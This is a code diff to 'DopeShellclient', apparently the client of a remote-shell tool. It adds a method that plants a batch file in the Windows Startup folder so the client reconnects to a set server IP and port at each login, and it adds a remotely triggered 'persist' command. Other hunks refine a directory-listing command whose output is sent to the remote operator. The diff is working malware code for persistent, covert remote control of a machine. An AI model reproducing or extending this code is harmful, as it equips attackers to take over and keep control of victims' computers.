@@ -5,6 +5,7 @@ import subprocess
 import os
 import getpass
 import platform
+import sys
 import shutil
 import base64
 import struct
@@ -46,6 +47,49 @@ class DopeShellclient:
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
         return decrypted_data
+    
+    def install_persistence(self):
+        try:
+            # Path to the startup folder
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            batch_file_path = os.path.join(startup_folder, 'DopeShellClient.bat')
+
+            # Get the path to the Python executable
+            python_executable = sys.executable
+            
+            # Find the package entry point
+            # Run `pip show DopeShell` and look for the `Location` field to find the installed package path
+            package_name = 'DopeShell'  # Replace with your package name if different
+            result = subprocess.run(['pip', 'show', package_name], capture_output=True, text=True)
+            package_path = None
+            for line in result.stdout.splitlines():
+                if line.startswith('Location:'):
+                    package_path = line.split(' ', 1)[1].strip()
+                    break
+            
+            if package_path is None:
+                raise Exception("Failed to determine package path.")
+
+            # Build the command to run the client
+            key_argument = f' --key {self.key}' if self.key else ''
+            entry_point_module = f'{package_name}.client'  # Adjust if the module name is different
+            command = f'"{python_executable}" -m {entry_point_module} --server-ip {self.server_ip} --server-port {self.server_port}{key_argument}'
+
+            # Create the batch file content
+            batch_content = f'''
+            @echo off
+            REM Run DopeShell client with specified arguments
+            {command}
+            '''
+
+            # Write the batch file
+            with open(batch_file_path, 'w') as batch_file:
+                batch_file.write(batch_content)
+
+            print(f"[*] Persistence established via batch file in startup folder: {batch_file_path}")
+
+        except Exception as e:
+            print(f"[-] Failed to establish persistence: {e}")
 
     def execute_command(self, command):
         invalid = False    
@@ -100,10 +144,20 @@ class DopeShellclient:
             elif command.lower().startswith('ls'):
                 directory = command.split()[1] if len(command.split()) > 1 else '.'
                 try:
-                    files = "\n".join(os.listdir(directory))
+                    items = os.listdir(directory)
+                    files = []
+                    for item in items:
+                        if os.path.isdir(os.path.join(directory, item)):
+                            files.append(f"{item}/")  # Append '/' for directories
+                        else:
+                            files.append(item)
+                    files_output = "\n".join(files)
                 except FileNotFoundError:
-                    files = f"[-] Directory '{directory}' not found."
-                self.send_data(files)
+                    files_output = f"[-] Directory '{directory}' not found."
+                except PermissionError:
+                    files_output = f"[-] Permission denied for '{directory}'."
+                self.send_data(files_output)
+
 
             elif command.lower() == 'pwd':
                 cwd = os.getcwd()
@@ -149,6 +203,9 @@ class DopeShellclient:
                 except Exception as e:
                     output = f"Failed to create directory '{directory}': {e}"
                 self.send_data(output)
+
+            elif command.lower() == 'persist':
+                self.install_persistence()
 
             elif command.lower().startswith('delete'):
                 _, file_path = command.split(' ', 1)
